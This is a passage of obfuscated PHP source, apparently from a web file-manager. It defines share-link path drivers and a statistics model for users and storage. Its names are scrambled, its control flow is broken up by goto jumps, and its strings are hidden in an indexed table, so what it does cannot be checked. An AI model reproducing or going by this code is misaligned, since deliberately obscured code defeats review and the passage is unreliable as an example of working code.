$cŒ¹Ğƒ¦ø¥->getPathInner($eİº“Ù±’š[$a‘›·©îØ¡[75]]); $a…Ğİ²ÖÌÉ = $e©³‘–ìÑä->addFileMake($F„† ’×ì“, $eİº“Ù±’š[$a‘›·©îØ¡[77]], $eİº“Ù±’š[$a‘›·©îØ¡[168]], $eİº“Ù±’š[$a‘›·©îØ¡[167]], $eİº“Ù±’š[$a‘›·©îØ¡[28]], $E¥§¦ÍŞê); $dÜóø¬Îø„[] = $a…Ğİ²ÖÌÉ; } goto bÁ¦œÃŞõª; fÚÅƒœó¨Ô: $C¸Ì­È¡¬ = $C¸Ì­È¡¬ ? $C¸Ì­È¡¬ : array(); foreach ($C¸Ì­È¡¬ as $FÜÙÈ”î©) { if (!isset($bÄ¾¢“×ãÃ[$FÜÙÈ”î©[$a‘›·©îØ¡[167]]])) { continue; } $cæË°æÑä =& $bÄ¾¢“×ãÃ[$FÜÙÈ”î©[$a‘›·©îØ¡[167]]]; foreach ($cæË°æÑä as &$bºÁÂ¢§æÀ) { $bºÁÂ¢§æÀ[$a‘›·©îØ¡[431]] = $FÜÙÈ”î©[$a‘›·©îØ¡[431]]; } unset($bºÁÂ¢§æÀ); } $DŒ‘øÊ†‡ = array(); goto C¾¼óÔö¶Û; e‰¦„òçº: $e©³‘–ìÑä = Model($a‘›·©îØ¡[556]); $C¸Ì­È¡¬ = $e©³‘–ìÑä->where($C§™ˆ¾´)->select(); $C¸Ì­È¡¬ = $C¸Ì­È¡¬ ? $C¸Ì­È¡¬ : array(); goto dø‹íìéÑ; C¾¼óÔö¶Û: foreach ($dŠ…ÚäÎï as $a´âÚ”‘©º) { $DŒ‘øÊ†‡[$a´âÚ”‘©º[$a‘›·©îØ¡[28]]] = $a´âÚ”‘©º; } return $DŒ‘øÊ†‡; goto B†°•‘Æ³Í; eËâ×ïÜ‹˜: $a‘›·©îØ¡ =& $_SERVER[‡’¶øåüç˜]; if (!$dŠ…ÚäÎï || count($dŠ…ÚäÎï) == 0) { return array(); } $bÄ¾¢“×ãÃ = array(); goto aÆ²Š±‹ç®; bÁ¦œÃŞõª: $e©³‘–ìÑä->addAll($dÜóø¬Îø„); $C§™ˆ¾´ = array($a‘›·©îØ¡[167] => array($a‘›·©îØ¡[7], array_keys($bÄ¾¢“×ãÃ))); $C¸Ì­È¡¬ = $e©³‘–ìÑä->where($C§™ˆ¾´)->select(); goto fÚÅƒœó¨Ô; B†°•‘Æ³Í: } } goto Fñ¦ „á‡ä; fè¿’Ã‹°Æ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($b—ÕóáÚİÂ) { $this->pathParse = $b—ÕóáÚİÂ; $this->model = Model($_SERVER[‡’¶øåüç˜][1124]); } protected function infoParse($E›ÊÑˆÙ, $eãÁ”Ñƒ÷Ï = false, $aôİÎÛ¥Ó³ = false) { $B•ªÈ ÀË =& $_SERVER[‡’¶øåüç˜]; return Action($B•ªÈ ÀË[1026])->sharePathInfo($this->pathParse[$B•ªÈ ÀË[75]], !0); } public function listPath($AÍÉ ‹ì, $A†ä®†ˆÁ÷ = false) { $cõÒ„¯ç¡ =& $_SERVER[‡’¶øåüç˜]; $D‘²š³Àæá = parent::listPath($AÍÉ ‹ì, $A†ä®†ˆÁ÷); foreach ($D‘²š³Àæá as $c•è š«§© => $cÈâãÒ¦áö) { if (!in_array($c•è š«§©, array($cõÒ„¯ç¡[73], $cõÒ„¯ç¡[74]))) { continue; } foreach ($cÈâãÒ¦áö as $E›èŞ¦ñç§ => $A®óÏË®ø) { $D‘²š³Àæá[$c•è š«§©][$E›èŞ¦ñç§] = Action($cõÒ„¯ç¡[1026])->shareItemInfo($A®óÏË®ø); } } return $D‘²š³Àæá; } public function listAll($aÙ°Ì¡¾ˆï) { goto f‘‡Ğ††Õ; f‘‡Ğ††Õ: $FÉô²óÇğ =& $_SERVER[‡’¶øåüç˜]; $dù¯‡õôÎë = IO::info($this->pathParse[$FÉô²óÇğ[75]]); if (!$dù¯‡õôÎë) { return array(); } goto D¥ä‘à‰è¾; D¥ä‘à‰è¾: $cé‘‹Ä®¿Œ = $this->model->listAll($aÙ°Ì¡¾ˆï); foreach ($cé‘‹Ä®¿Œ as &$eˆ¶ª«ÊÚ´) { $eˆ¶ª«ÊÚ´[$FÉô²óÇğ[403]] = Action($FÉô²óÇğ[1026])->shareItemInfo($eˆ¶ª«ÊÚ´[$FÉô²óÇğ[403]]); } unset($eˆ¶ª«ÊÚ´); goto F®áƒİ®¸¤; F®áƒİ®¸¤: return $cé‘‹Ä®¿Œ; goto Bò‡ó®Ò…; Bò‡ó®Ò…: } } class PathDriverDriverShareItem { public function __construct($e‰çùïÕ‘) { $this->pathParse = $e‰çùïÕ‘; } public function __call($f¢æ‘‚É¼Ã, $A´™©Ï™Ü) { $A¥İ‰î¾– =& $_SERVER[‡’¶øåüç˜]; if (method_exists($this, $f¢æ‘‚É¼Ã)) { return; } $bãÊ¢‚à² = call_user_func_array(array($A¥İ‰î¾–[1132], $f¢æ‘‚É¼Ã), $A´™©Ï™Ü); $C‹÷ë¢–à„ = array($A¥İ‰î¾–[1133], $A¥İ‰î¾–[1134], $A¥İ‰î¾–[1135], $A¥İ‰î¾–[1136], $A¥İ‰î¾–[503], $A¥İ‰î¾–[505], $A¥İ‰î¾–[1137], $A¥İ‰î¾–[103], $A¥İ‰î¾–[1138], $A¥İ‰î¾–[1139]); if (in_array($f¢æ‘‚É¼Ã, $C‹÷ë¢–à„)) { $bãÊ¢‚à² = $this->getPathOuter($bãÊ¢‚à²); } return $bãÊ¢‚à²; } public function copy($A™¼«ƒçè, $bˆí–ËÏ¿´, $FÚÓÑÒŸ® = false) { return $this->copyMove($A™¼«ƒçè, $bˆí–ËÏ¿´, $FÚÓÑÒŸ®, $_SERVER[‡’¶øåüç˜][503]); } public function move($dóìçƒƒÎ, $bö°¼Û¥°ñ, $aœ§„é²ÇÜ = false) { return $this->copyMove($dóìçƒƒÎ, $bö°¼Û¥°ñ, $aœ§„é²ÇÜ, $_SERVER[‡’¶øåüç˜][505]); } private function copyMove($EïØä“îÍ¸, $cƒÄ¤Ÿœä, $B•²Èªİ†¹, $c·‚›ºÄƒ) { goto dæ¢•µ±„ß; a¾Ø‚İõß¿: return $D¿ˆŠƒ”£; goto Dé¤ƒ„Ş®í; dæ¢•µ±„ß: $B¼ßí´îÛ =& $_SERVER[‡’¶øåüç˜]; $eËÎ‘ì˜ë = $cƒÄ¤Ÿœä; $fˆ­Š…“ = IO::driverMake($cƒÄ¤Ÿœä); goto C––¬ºáæ³; C––¬ºáæ³: if ($fˆ­Š…“->pathParse[$B¼ßí´îÛ[1002]]) { $cƒÄ¤Ÿœä = $fˆ­Š…“->pathParse[$B¼ßí´îÛ[1002]]; } else { $cƒÄ¤Ÿœä = $eËÎ‘ì˜ë; } $D¿ˆŠƒ”£ = IO::copyMove($EïØä“îÍ¸, $cƒÄ¤Ÿœä, $B•²Èªİ†¹, $c·‚›ºÄƒ); $D¿ˆŠƒ”£ = $this->getPathOuter($D¿ˆŠƒ”£); goto a¾Ø‚İõß¿; Dé¤ƒ„Ş®í: } public function pathFather($bÄÏœĞÎÙ¨) { return get_path_father($this->pathParse[$_SERVER[‡’¶øåüç˜][75]]); } public function iconvSystem($b­¥å¡šÊŠ) { return $b­¥å¡šÊŠ; } protected function infoParse($d…°¬ßÒ›, $Cßåªö‡ªì = false) { $D²‰ÎÌ›˜Ì =& $_SERVER[‡’¶øåüç˜]; $aˆ˜ó¦„Â¸ = $this->pathParse[$D²‰ÎÌ›˜Ì[450]][$D²‰ÎÌ›˜Ì[1027]] . $this->pathParse[$D²‰ÎÌ›˜Ì[1020]]; if ($Cßåªö‡ªì) { $cåŠîÅÜ÷’ = IO::infoWithChildren($aˆ˜ó¦„Â¸); } else { $cåŠîÅÜ÷’ = IO::info($aˆ˜ó¦„Â¸); } $EØÙÓ‡°¢ì = $this->pathParse[$D²‰ÎÌ›˜Ì[450]]; return Action($D²‰ÎÌ›˜Ì[1131])->_shareItemeParse($cåŠîÅÜ÷’, $EØÙÓ‡°¢ì); } public function listAll($D¹èÂæ¼ºÒ) { $b’…”±ŒÈ =& $_SERVER[‡’¶øåüç˜]; $DäƒöŒ˜À = IO::listAll($D¹èÂæ¼ºÒ); $DŸììÀ‚¢© = $this->pathParse[$b’…”±ŒÈ[450]]; foreach ($DäƒöŒ˜À as &$dŠŠˆŠ…ìÛ) { check_abort(); $dŠŠˆŠ…ìÛ = array_merge(IO::info($dŠŠˆŠ…ìÛ[$b’…”±ŒÈ[75]]), $dŠŠˆŠ…ìÛ); $dŠŠˆŠ…ìÛ[$b’…”±ŒÈ[403]] = Action($b’…”±ŒÈ[1131])->_shareItemeParse($dŠŠˆŠ…ìÛ, $DŸììÀ‚¢©); } unset($dŠŠˆŠ…ìÛ); return $DäƒöŒ˜À; } public function getPathOuter($F „ÔÃ¹Û¡) { goto CìÅÓ…ªáò; dã¾ì·¢’: if (substr($Cšİ‡©š‹è, 0, strlen($FÀŠµôêß•)) != $FÀŠµôêß•) { return !1; } return $this->pathParse[$AöŞòËÚ¸[1021]] . $AöŞòËÚ¸[8] . ltrim($EÏÕŒ›«‰”, $AöŞòËÚ¸[8]); goto cƒ‚ãîÈ¾…; CìÅÓ…ªáò: $AöŞòËÚ¸ =& $_SERVER[‡’¶øåüç˜]; $f «­“Ã‘ = KodIO::parse($F „ÔÃ¹Û¡); if ($f «­“Ã‘[$AöŞòËÚ¸[29]] == KodIO::KOD_SHARE_ITEM) { return $f «­“Ã‘[$AöŞòËÚ¸[75]]; } goto fÏÖäõˆÁ; fÏÖäõˆÁ: $Cšİ‡©š‹è = KodIO::clear($F „ÔÃ¹Û¡); $FÀŠµôêß• = KodIO::clear($this->pathParse[$AöŞòËÚ¸[450]][$AöŞòËÚ¸[1027]]); $EÏÕŒ›«‰” = substr($Cšİ‡©š‹è, strlen($FÀŠµôêß•)); goto dã¾ì·¢’; cƒ‚ãîÈ¾…: } public function getType() { $CÚÄ‰®íßÕ =& $_SERVER[‡’¶øåüç˜]; $cèÀÎêñğ = str_replace($CÚÄ‰®íßÕ[71], $CÚÄ‰®íßÕ[33], get_class($this)); return strtolower($cèÀÎêñğ); } public function isTypeObject($eˆŸî®êÑ„) { return IO::isTypeObject($eˆŸî®êÑ„); } public function info($f†ÄËçÍ·) { return $this->infoParse($f†ÄËçÍ·); } public function infoAuth($E×ëµíÚ­Ù) { return $this->infoParse($E×ëµíÚ­Ù); } public function infoWithChildren($bÄ–ÎÚ«) { return $this->infoParse($bÄ–ÎÚ«, !0); } public function infoFull($A÷œˆÛ÷Ó§) { return $this->infoParse($A÷œˆÛ÷Ó§); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($CÙ¼·ƒº™°) { $this->pathParse = $CÙ¼·ƒº™°; } protected function infoParse($d”ŠÈéÕ¢, $aïø„‘†‚® = false) { $eíİŞ×¹Â =& $_SERVER[‡’¶øåüç˜]; return Action($eíİŞ×¹Â[1026])->sharePathInfo($this->pathParse[$eíİŞ×¹Â[75]], !0, $aïø„‘†‚®); } public function listPath($Eˆ¸è²™Œ, $cÔ…óÄ° = false) { $DØµŒÈÄ¶ğ =& $_SERVER[‡’¶øåüç˜]; $bï¹ŠÛ³¼ = IO::listPath($Eˆ¸è²™Œ, $cÔ…óÄ°); foreach ($bï¹ŠÛ³¼ as $aœ‚™™¿å => $AÛ‡õ´Ü÷) { if (!in_array($aœ‚™™¿å, array($DØµŒÈÄ¶ğ[73], $DØµŒÈÄ¶ğ[74]))) { continue; } foreach ($AÛ‡õ´Ü÷ as $c¸ä›‡ìï => $EÈË‡Äß×ß) { $EÈË‡Äß×ß = Action($DØµŒÈÄ¶ğ[1140])->parsePathChildren($EÈË‡Äß×ß, array($DØµŒÈÄ¶ğ[399] => $Eˆ¸è²™Œ)); $bï¹ŠÛ³¼[$aœ‚™™¿å][$c¸ä›‡ìï] = Action($DØµŒÈÄ¶ğ[1026])->shareItemInfo($EÈË‡Äß×ß); } } return $bï¹ŠÛ³¼; } public function listAll($eˆ¤‹³Ò‚) { $AÄ–º†Ûñ =& $_SERVER[‡’¶øåüç˜]; $DšöôÛ—¼ = IO::listAll($eˆ¤‹³Ò‚); foreach ($DšöôÛ—¼ as &$Cñ©¿…Œªª) { $Cñ©¿…Œªª = array_merge(IO::info($Cñ©¿…Œªª[$AÄ–º†Ûñ[75]]), $Cñ©¿…Œªª); $Cñ©¿…Œªª[$AÄ–º†Ûñ[403]] = Action($AÄ–º†Ûñ[1026])->shareItemInfo($Cñ©¿…Œªª); } unset($Cñ©¿…Œªª); return $DšöôÛ—¼; } } goto Dç°›ã¥Š; cÓ¶ïæÆ˜Ø: define($_SERVER[‡’¶øåüç˜][231], 2); define($_SERVER[‡’¶øåüç˜][232], 3); define($_SERVER[‡’¶øåüç˜][233], 1); goto fÍ£¹ßœÄ; fõÀö˜ö¼­: function beforeShutdownFatalError($cƒŸê§îÅ) { think_exception($cƒŸê§îÅ); } $_SERVER[$_SERVER[úÎ][45]] = $bÚ–æØñ¦‘($_SERVER[$_SERVER[úÎ][42]]); $E„Ïˆ°‰¹â = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto D‹¹Ã³èŸ¾; f…ŒˆÑá©ó: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($A‡îìšÓ¢„) { $bİÈ¼“¾Â™ =& $_SERVER[‡’¶øåüç˜]; $Eã–…ŸÕÕî = array($bİÈ¼“¾Â™[547] => array($bİÈ¼“¾Â™[29] => $bİÈ¼“¾Â™[2037], $bİÈ¼“¾Â™[265] => array($bİÈ¼“¾Â™[214], $bİÈ¼“¾Â™[706], $bİÈ¼“¾Â™[2038], $bİÈ¼“¾Â™[2039])), $bİÈ¼“¾Â™[2040] => array($bİÈ¼“¾Â™[29] => $bİÈ¼“¾Â™[2041], $bİÈ¼“¾Â™[265] => array($bİÈ¼“¾Â™[214], $bİÈ¼“¾Â™[704], $bİÈ¼“¾Â™[2042], $bİÈ¼“¾Â™[2043], $bİÈ¼“¾Â™[2044]))); if (!isset($Eã–…ŸÕÕî[$A‡îìšÓ¢„])) { return !1; } $this->optionType = $Eã–…ŸÕÕî[$A‡îìšÓ¢„][$bİÈ¼“¾Â™[29]]; $this->field = $Eã–…ŸÕÕî[$A‡îìšÓ¢„][$bİÈ¼“¾Â™[265]]; return !0; } public function listData($Dõ±ìŒ¼†á = false, $C±Ğßê¿•‰ = "\x6d\x6f\144\151\x66\171\124\151\155\145", $ašíĞ­ø£¸ = false) { return parent::listData($Dõ±ìŒ¼†á, $C±Ğßê¿•‰, $ašíĞ­ø£¸); } public function trendList($aÃ£Ùì­˜º) { goto C­¡‡²áÀ—; AÉ›¨ß : if (!isset($E…õõ¦ğ‹)) { $bˆÀÅÅóê = $aÃ£Ùì­˜º == $e…ÄôŒíä[547] ? $e…ÄôŒíä[490] : $e…ÄôŒíä[758]; $E…õõ¦ğ‹ = Model($bˆÀÅÅóê)->min($e…ÄôŒíä[191]); } $fğ­Î¶µƒ = $e…ÄôŒíä[2047] . ucfirst($aÃ£Ùì­˜º); $BÆÂí»½ = $this->dateList($E…õõ¦ğ‹); goto cóº»ÏÅÎ‘; C­¡‡²áÀ—: $e…ÄôŒíä =& $_SERVER[‡’¶øåüç˜]; $aèã÷‹ŸŞ½ = $this->listData(); if ($aèã÷‹ŸŞ½) { $B¥–âÄâ¿ª = end($aèã÷‹ŸŞ½); $E£Ôµ£Úá = date($e…ÄôŒíä[2045], strtotime($e…ÄôŒíä[2046])); if ($B¥–âÄâ¿ª[$e…ÄôŒíä[214]] == $E£Ôµ£Úá) { return $aèã÷‹ŸŞ½; } $E…õõ¦ğ‹ = strtotime($B¥–âÄâ¿ª[$e…ÄôŒíä[214]]); } goto AÉ›¨ß ; cóº»ÏÅÎ‘: foreach ($BÆÂí»½ as $E£Ôµ£Úá) { $this->{$fğ­Î¶µƒ}($E£Ôµ£Úá); } return $this->listData(); goto dô±ªëœÓ; dô±ªëœÓ: } private function dateList($eÔ°ÏÛ) { $dŸ¾§ôˆ¹ =& $_SERVER[‡’¶øåüç˜]; $bìçœ·óàŞ = $eÔ°ÏÛ; $EåÍÕ÷ğö = strtotime($dŸ¾§ôˆ¹[2046]); $bîŸæ½ É¾ = array(); while ($bìçœ·óàŞ <= $EåÍÕ÷ğö) { $bîŸæ½ É¾[] = date($dŸ¾§ôˆ¹[2045], $bìçœ·óàŞ); $bìçœ·óàŞ = strtotime($dŸ¾§ôˆ¹[2048], $bìçœ·óàŞ); } return $bîŸæ½ É¾; } public function _recordUser($dÖÅÑÈÇÈà = '') { goto cáŒÅ»…³®; cáŒÅ»…³®: $aòçšÓÀù =& $_SERVER[‡’¶øåüç˜]; $d±Ö°æ©Ö‘ = strtotime(date($aòçšÓÀù[2049], strtotime($dÖÅÑÈÇÈà))); $BêíÈØÀ¬¿ = strtotime(date($aòçšÓÀù[2050], strtotime($dÖÅÑÈÇÈà))); goto C¨¢‰šº; C»ìùæ¥œ: $DÄª”ì‘ = Model($aòçšÓÀù[490])->where($Dè¯Úºø¹ñ)->count($aòçšÓÀù[1443]); $Dè¯Úºø¹ñ[$aòçšÓÀù[29]] = $aòçšÓÀù[2051]; $Dñ½“´Ù²ê = Model($aòçšÓÀù[2052])->where($Dè¯Úºø¹ñ)->count($aòçšÓÀù[2053]); goto FğÊù¯â½; FğÊù¯â½: $EÌÂš¨¾“¿ = array($aòçšÓÀù[214] => $dÖÅÑÈÇÈà, $aòçšÓÀù[706] => (int) $CÈ¿‹—šŒ, $aòçšÓÀù[2038] => (int) $DÄª”ì‘, $aòçšÓÀù[2039] => (int) $Dñ½“´Ù²ê); return $this->insert($EÌÂš¨¾“¿); goto b‚Ôï¬ÄÊ¹; C¨¢‰šº: $Dè¯Úºø¹ñ = array($aòçšÓÀù[191] => array($aòçšÓÀù[930], $BêíÈØÀ¬¿)); $CÈ¿‹—šŒ = Model($aòçšÓÀù[490])->where($Dè¯Úºø¹ñ)->count($aòçšÓÀù[1443]); $Dè¯Úºø¹ñ[$aòçšÓÀù[191]] = array($aòçšÓÀù[325], array($d±Ö°æ©Ö‘, $BêíÈØÀ¬¿)); goto C»ìùæ¥œ; b‚Ôï¬ÄÊ¹: } public function _recordStore($D¦¬¥˜ÁØŒ = '') { goto a‘´áÚ“ÀÑ; aºŠ²¢­¶: $aœµíå™ƒÑ = Model($c¾¯ÑÊ·¸œ[758])->where($D‰¹Ã¯Âù»)->sum($c¾¯ÑÊ·¸œ[77]); $f¶ó‹ß·Ü = array($c¾¯ÑÊ·¸œ[214] => $D¦¬¥˜ÁØŒ, $c¾¯ÑÊ·¸œ[704] => (int) $fíøñğĞ‡ã, $c¾¯ÑÊ·¸œ[2042] => (int) $AêÒïÕ×´¤, $c¾¯ÑÊ·¸œ[2043] => (int) $b¹œ®İàÈ, $c¾¯ÑÊ·¸œ[2044] => (int) $aœµíå™ƒÑ); return $this->insert($f¶ó‹ß·Ü); goto Ağ’ƒÅÑ´Ô; fÁ¾é²Á¦: $AêÒïÕ×´¤ = Model($c¾¯ÑÊ·¸œ[434])->where($D‰¹Ã¯Âù»)->sum($c¾¯ÑÊ·¸œ[77]); $D‰¹Ã¯Âù»[$c¾¯ÑÊ·¸œ[382]] = 0; $fíøñğĞ‡ã = Model($c¾¯ÑÊ·¸œ[758])->where($D‰¹Ã¯Âù»)->sum($c¾¯ÑÊ·¸œ[77]); goto b…ì‘¹´•; a‘´áÚ“ÀÑ: $c¾¯ÑÊ·¸œ =& $_SERVER[‡’¶øåüç˜]; $CÑ‚Œí†ø° = strtotime(date($c¾¯ÑÊ·¸œ[2050], strtotime($D¦¬¥˜ÁØŒ))); $D‰¹Ã¯Âù» = array($c¾¯ÑÊ·¸œ[191] => array($c¾¯ÑÊ·¸œ[930], $CÑ‚Œí†ø°)); goto fÁ¾é²Á¦; b…ì‘¹´•: $D‰¹Ã¯Âù»[$c¾¯ÑÊ·¸œ[383]] = 1; $b¹œ®İàÈ = Model($c¾¯ÑÊ·¸œ[758])->where($D‰¹Ã¯Âù»)->sum($c¾¯ÑÊ·¸œ[77]); $D‰¹Ã¯Âù»[$c¾¯ÑÊ·¸œ[383]] = 2; goto aºŠ²¢­¶; Ağ’ƒÅÑ´Ô: } public function trend($fÊ¹ŠÉ‘¦, $b¬¥ÏõÏÃİ) { goto EÙâ³ÆùøÄ; dÎƒ®´›±: if (empty($Aù‹‘ÁÅ¹Á)) { $e¶¿ò´÷Âå = date($d«ºÕŠ™Û[2045], strtotime($d«ºÕŠ™Û[2046])); $B‚¨˜¿‡ = array($d«ºÕŠ™Û[214] => $e¶¿ò´÷Âå); foreach ($d›‹ÇÀÅá[$fÊ¹ŠÉ‘¦] as $f±Õ±¥ºÚÛ => $b÷«ÅµŠË) { $B‚¨˜¿‡[$f±Õ±¥ºÚÛ] = 0; } $Aù‹‘ÁÅ¹Á[] = $B‚¨˜¿‡; } $aù‚Ôñò± = array(); foreach ($Aù‹‘ÁÅ¹Á as $b÷«ÅµŠË) { if ($fÊ¹ŠÉ‘¦ == $d«ºÕŠ™Û[2040] && $b÷«ÅµŠË[$d«ºÕŠ™Û[2042]] > $b÷«ÅµŠË[$d«ºÕŠ™Û[704]]) { $b÷«ÅµŠË[$d«ºÕŠ™Û[2042]] = $b÷«ÅµŠË[$d«ºÕŠ™Û[704]]; } foreach ($d›‹ÇÀÅá[$fÊ¹ŠÉ‘¦] as $f±Õ±¥ºÚÛ => $EóÖ¨ˆò) { $B›²İÅ³×º = array($d«ºÕŠ™Û[214] => $b÷«ÅµŠË[$d«ºÕŠ™Û[214]], $d«ºÕŠ™Û[1348] => $EóÖ¨ˆò); $B›²İÅ³×º[$bÂ‚„ŠÇÎ[$fÊ¹ŠÉ‘¦]] = isset($b÷«ÅµŠË[$f±Õ±¥ºÚÛ]) ? $b÷«ÅµŠË[$f±Õ±¥ºÚÛ] : 0; $aù‚Ôñò±[] = $B›²İÅ³×º; } } goto A»‰¹Í‹÷ê; A»‰¹Í‹÷ê: return $aù‚Ôñò±; goto BÎ«õÄ±Ïó; EÙâ³ÆùøÄ: $d«ºÕŠ™Û =& $_SERVER[‡’¶øåüç˜]; if (!$this->init($fÊ¹ŠÉ‘¦)) { return !1; } $Aù‹‘ÁÅ¹Á = $this->trendList($fÊ¹ŠÉ‘¦); goto DèÜóÑØ‚°; DèÜóÑØ‚°: if ($Aù‹‘ÁÅ¹Á && $b¬¥ÏõÏÃİ != $d«ºÕŠ™Û[1418]) { $E«¯Š‹èÂù = $Aù‹‘ÁÅ¹Á[0][$d«ºÕŠ™Û[214]]; $C…ØçëİÏŒ = $this->validDate($b¬¥ÏõÏÃİ, $E«¯Š‹èÂù); $F¹ƒãªÈ´ = array(); $d†Öë÷¯İ¡ = array_to_keyvalue($Aù‹‘ÁÅ¹Á, $d«ºÕŠ™Û[214]); foreach ($C…ØçëİÏŒ as $e¶¿ò´÷Âå) { if (isset($d†Öë÷¯İ¡[$e¶¿ò´÷Âå])) { $B›²İÅ³×º = $d†Öë÷¯İ¡[$e¶¿ò´÷Âå]; } else { $B›²İÅ³×º = end($Aù‹‘ÁÅ¹Á); $B›²İÅ³×º[$d«ºÕŠ™Û[214]] = $e¶¿ò´÷Âå; if ($fÊ¹ŠÉ‘¦ == $d«ºÕŠ™Û[547]) { $B›²İÅ³×º[$d«ºÕŠ™Û[2038]] = $B›²İÅ³×º[$d«ºÕŠ™Û[2039]] = 0; } } $F¹ƒãªÈ´[] = $B›²İÅ³×º; } $Aù‹‘ÁÅ¹Á = $F¹ƒãªÈ´; } $d›‹ÇÀÅá = array($d«ºÕŠ™Û[547] => array($d«ºÕŠ™Û[706] => LNG($d«ºÕŠ™Û[2054]), $d«ºÕŠ™Û[2038] => LNG($d«ºÕŠ™Û[2055]), $d«ºÕŠ™Û[2039] => LNG($d«ºÕŠ™Û[2056])), $d«ºÕŠ™Û[2040] => array($d«ºÕŠ™Û[704] => LNG($d«ºÕŠ™Û[2057]), $d«ºÕŠ™Û[2042] => LNG($d«ºÕŠ™Û[2058]), $d«ºÕŠ™Û[2043] => LNG($d«ºÕŠ™Û[2059]), $d«ºÕŠ™Û[2044] => LNG($d«ºÕŠ™Û[2060]))); $bÂ‚„ŠÇÎ = array($d«ºÕŠ™Û[547] => $d«ºÕŠ™Û[2061], $d«ºÕŠ™Û[2040] => $d«ºÕŠ™Û[77]); goto dÎƒ®´›±; BÎ«õÄ±Ïó: } public function validDate($a”ê¤ƒïâª, $Fæ©ç±ïŠÁ) { goto E“æ¥¹ƒƒò; E“æ¥¹ƒƒò: $Fˆ¼Ú”ó­ø =& $_SERVER[‡’¶øåüç˜]; $Fëˆ¸à¥¬¬ = date($Fˆ¼Ú”ó­ø[2045], strtotime($Fˆ¼Ú”ó­ø[2046])); $BÛŒ÷è¤É½ = array($Fëˆ¸à¥¬¬); goto EÑ˜Ï™Í«÷; C‰ÒæçÌ: return $BÛŒ÷è¤É½; goto BíÕè·›“; EÑ˜Ï™Í«÷: switch ($a”ê¤ƒïâª) { case $Fˆ¼Ú”ó­ø[1425]: $DÉğÓøŠƒİ = mktime(0, 0, 0, date($Fˆ¼Ú”ó­ø[2062]), date($Fˆ¼Ú”ó­ø[2063]) - date($Fˆ¼Ú”ó­ø[1232]) + 7 - 7, date($Fˆ¼Ú”ó­ø[2064])); $f‡ÍĞãæ¤¸ = 0; do { $Cçìé½Æ‚‡ = date($Fˆ¼Ú”ó­ø[2045], $DÉğÓøŠƒİ - 3600 * 24 * 7 * $f‡ÍĞãæ¤¸); $BÛŒ÷è¤É½[] = $Cçìé½Æ‚‡; $f‡ÍĞãæ¤¸++; } while ($Fæ©ç±ïŠÁ < $Cçìé½Æ‚‡); break; case $Fˆ¼Ú”ó­ø[1423]: $f‡ÍĞãæ¤¸ = 1; do { $D¬îïóîÉ» = date($Fˆ¼Ú”ó­ø[2065], strtotime("\x2d\x20{$f‡ÍĞãæ¤¸}\x20\x6d\157\156\x74\x68\163")); $BÛŒ÷è¤É½[] = $D¬îïóîÉ»; $f‡ÍĞãæ¤¸++; } while ($Fæ©ç±ïŠÁ < $D¬îïóîÉ»); break; case $Fˆ¼Ú”ó­ø[1730]: $F·ìŒ´Ô = (int) date($Fˆ¼Ú”ó­ø[2064], strtotime($Fæ©ç±ïŠÁ)); $bˆ¢ÑÄÔåÊ = (int) date($Fˆ¼Ú”ó­ø[2064]); if ($F·ìŒ´Ô >= $bˆ¢ÑÄÔåÊ) { break; } for ($F·ìŒ´Ô; $F·ìŒ´Ô < $bˆ¢ÑÄÔåÊ; $F·ìŒ´Ô++) { $BÛŒ÷è¤É½[] = $F·ìŒ´Ô . $Fˆ¼Ú”ó­ø[2066]; } break; default: break; } if ($Fæ©ç±ïŠÁ > end($BÛŒ÷è¤É½)) { array_pop($BÛŒ÷è¤É½); } sort($BÛŒ÷è¤É½); goto C‰ÒæçÌ; BíÕè·›“: } public function listTable($c­öÃ¢¶»–) { $BÚÉÍ±ƒù = ucfirst($c­öÃ¢¶»–); return Model($BÚÉÍ±ƒù)->listData(); } public function option($eŠåÄ¸„¦Ò) { $b¼©¢ŠÊ = $_SERVER[‡’¶øåüç˜][2067] . ucfirst($eŠåÄ¸„¦Ò); return $this->{$b¼©¢ŠÊ}(); } private function optionUser() { goto CéŒìùëİ; F”ÊòÛÒÉõ: $fªÉ©÷°ŒĞ = strtotime($E»ÍÆ½ ì§[2069]); $eÆß’ŒĞ´‡ = array($E»ÍÆ½ ì§[2070] => array($E»ÍÆ½ ì§[931], $fªÉ©÷°ŒĞ)); $f™Õ¿‚óô = (int) Model($E»ÍÆ½ ì§[490])->where($eÆß’ŒĞ´‡)->count($E»ÍÆ½ ì§[1443]); goto AİàéŞ™¡; CéŒìùëİ: $E»ÍÆ½ ì§ =& $_SERVER[‡’¶øåüç˜]; $C­·ñ·µƒ = Model($E»ÍÆ½ ì§[490])->count($E»ÍÆ½ ì§[1443]); $A÷êŞÁÊÈ‹ = Model($E»ÍÆ½ ì§[490])->where($E»ÍÆ½ ì§[2068])->count($E»ÍÆ½ ì§[1443]); goto F”ÊòÛÒÉõ; AİàéŞ™¡: if (!$f™Õ¿‚óô) { $f™Õ¿‚óô = 1; } $fªÉ©÷°ŒĞ = strtotime(date($E»ÍÆ½ ì§[2049])); $eÆß’ŒĞ´‡ = array($E»ÍÆ½ ì§[2070] => array($E»ÍÆ½ ì§[931], $fªÉ©÷°ŒĞ)); goto f§­«¶óÉ˜; f§­«¶óÉ˜: $E„•–·òä„ = Model($E»ÍÆ½ ì§[490])->where($eÆß’ŒĞ´‡)->count($E»ÍÆ½ ì§[1443]); return array($E»ÍÆ½ ì§[701] => (int) $C­·ñ·µƒ, $E»ÍÆ½ ì§[2071] => (int) ($C­·ñ·µƒ - $A÷êŞÁÊÈ‹), $E»ÍÆ½ ì§[2072] => (int) $A÷êŞÁÊÈ‹, $E»ÍÆ½ ì§[2073] => (int) $E„•–·òä„, $E»ÍÆ½ ì§[2074] => $f™Õ¿‚óô); goto B‚éÊ¹ƒ‰Å; B‚éÊ¹ƒ‰Å: } private function optionFile() { goto B­İîº£ ; B­İîº£ : $Eù²ë„­ÉŠ =& $_SERVER[‡’¶øåüç˜]; $E‡’¡Ó‡‹’ = $this->sourceSize(); $A²ÃôòŞ†‚ = $E‡’¡Ó‡‹’[$Eù²ë„­ÉŠ[77]]; goto b•Ãš¼½–š; b•Ãš¼½–š: $f¦Ü²ã « = $E‡’¡Ó‡‹’[$Eù²ë„­ÉŠ[2042]]; $Eì®ÃËîî… = Model($Eù²ë„­ÉŠ[758])->where(array($Eù²ë„­ÉŠ[382] => 